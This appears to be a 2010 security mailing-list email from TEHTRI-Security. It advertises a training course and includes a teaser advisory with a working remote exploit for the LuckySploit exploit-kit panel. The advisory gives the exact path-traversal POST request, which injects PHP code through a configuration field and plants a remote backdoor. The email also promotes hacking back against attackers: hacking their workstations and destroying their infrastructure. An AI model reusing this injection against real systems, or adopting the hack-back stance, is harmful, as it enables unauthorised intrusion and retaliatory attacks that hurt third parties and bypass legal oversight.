Gents,

We wanted to let you know that TEHTRI-Security will release many 0days 
and offensive technologies during a new training called :

- "Hunting Web Attackers"

It will be proposed during HackInTheBox SecConf Malaysia 2010 in 
October, in Kuala Lumpur.

The 0days will be disclosed under a NDA (for students only) and will 
help at fighting back web attackers, as we already explained in the past 
in China and in Singapore (SyScan).

As a teaser, this email contains one of our remote 0day exploits. We 
also found 0days against Zeus, Eleonore, CrimePack, etc.
Our self-defense cyber-weapons will be disclosed during this training.

------ BEGIN Security Advisory ------

Vuln : TEHTRI-SA-2010-018
Tool : LuckySploit Exploit Pack
Title: Remote execution in LuckySploit

LuckySploit is a tool used by attackers to penetrate companies or 
personal computers by abusing client-side vulnerabilities. This malware 
exploitation kit is full of anti Microsoft technologies.

By auditing this Malware, TEHTRI-Security has found a pre-auth remote 
exploit in the file /mod/to.php

By sending a specially crafted HTTP packet with a POST argument, it's 
possible to simulate a configuration modification, and to inject PHP 
code that will be able to be executed after.

Here is an example, where we modify the remote file "7.php" by adding 
our own PHP code inside it (PoC anti kiddies: phpinfo() added).

POST sent to
http://target/luckysploit/mod/to.php?mod=thread_optn&id=../../tconf/7

With arguments :
z=1&exp_pre_config=2&advanced_unik=0&referer_not_empty=0&JS_MODE=0&unquie_type=0&unquie_time=10000000%3Bphpinfo%28%29%3Bexit%28%29%3B%3F%3Eaa&stat_packtime=10&country_allow_list=&referer_only=&traff_back_url=&gzip_status=1&gzip_status2=1&ip2cos=1&system_status=1&referer_status=1&puniqstatus=1&puniqblock=0

Then you can access your new remote backdoor here :
http://target/luckysploit/tconf/7.php

This exploit is provided by TEHTRI-Security as a technical proof to show 
that defenders who are under attack, might be able to strike back 
against a group of evil intruders trying to commit cyber crimes against 
them. But this should not be used out of legal field.

This might help at getting the identities of attackers, or at hacking 
their workstations, or at destroying their tools and infrastructures 
(anti-cyber-war & anti-cyber-spy technologies).
